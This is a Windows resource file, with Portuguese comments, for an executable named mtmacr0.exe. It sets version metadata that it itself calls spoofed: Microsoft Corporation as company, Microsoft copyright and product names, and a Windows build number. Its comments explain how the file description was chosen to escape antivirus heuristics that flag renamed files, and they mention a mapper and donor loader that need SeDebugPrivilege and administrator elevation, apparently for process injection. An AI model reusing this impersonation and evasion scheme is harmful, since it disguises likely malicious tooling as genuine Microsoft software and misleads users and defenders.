#include <winver.h>

// UAC — requireAdministrator (hardening-p3): o manifest e' gerado/embutido pelo
// linker via UACExecutionLevel no vcxproj (nAO aqui). Nao colocar "1 24"
// neste .rc: o /manifest:embed do link ja' usa o par (RT_MANIFEST, id 1) e
// repetir causa CVT1100 (recurso duplicado). Por que elevado sempre: o mapper
// e o loader de doador precisam de SeDebugPrivilege no momento exato da
// chamada; o manifest faz o prompt uma unica vez no lugar da falha silenciosa.

//
// Spoofed VERSIONINFO — Mimics a legitimate Windows system binary.
// This populates the "Details" tab in file properties and changes
// the PE version resource signature.
//

VS_VERSION_INFO VERSIONINFO
 FILEVERSION    10,0,22621,3880
 PRODUCTVERSION 10,0,22621,3880
 FILEFLAGSMASK  VS_FFI_FILEFLAGSMASK
 FILEFLAGS      0x0L
 FILEOS         VOS_NT_WINDOWS32
 FILETYPE       VFT_APP
 FILESUBTYPE    VFT2_UNKNOWN
BEGIN
    BLOCK "StringFileInfo"
    BEGIN
        BLOCK "040904b0"
        BEGIN
            VALUE "CompanyName",      "Microsoft Corporation"
            // NAO usar "Runtime Broker" aqui.
            //
            // O nome do arquivo e' `mtmacr0.exe`. Uma descricao que declara
            // ser um componente Windows ESPECIFICO (Runtime Broker) cria uma
            // inconsistencia nome<->descricao — e inconsistencia entre o nome
            // do arquivo e os proprios metadados e' uma heuristica PIOR que o
            // nome sozinho: e' a assinatura de "arquivo renomeado a mao".
            //
            // "Windows System Component" e' a descricao generica que varios
            // binarios legitimos da Microsoft usam — neutra, sem reivindicar
            // ser um processo especifico.
            VALUE "FileDescription",  "Windows System Component"
            VALUE "FileVersion",      "10.0.22621.3880 (WinBuild.160101.0800)"
            VALUE "InternalName",     "mtmacr0"
            VALUE "LegalCopyright",   "\251 Microsoft Corporation. All rights reserved."
            VALUE "OriginalFilename", "mtmacr0.exe"
            VALUE "ProductName",      "Microsoft\256 Windows\256 Operating System"
            VALUE "ProductVersion",   "10.0.22621.3880"
        END
    END
    BLOCK "VarFileInfo"
    BEGIN
        VALUE "Translation", 0x0409, 1200
    END
END
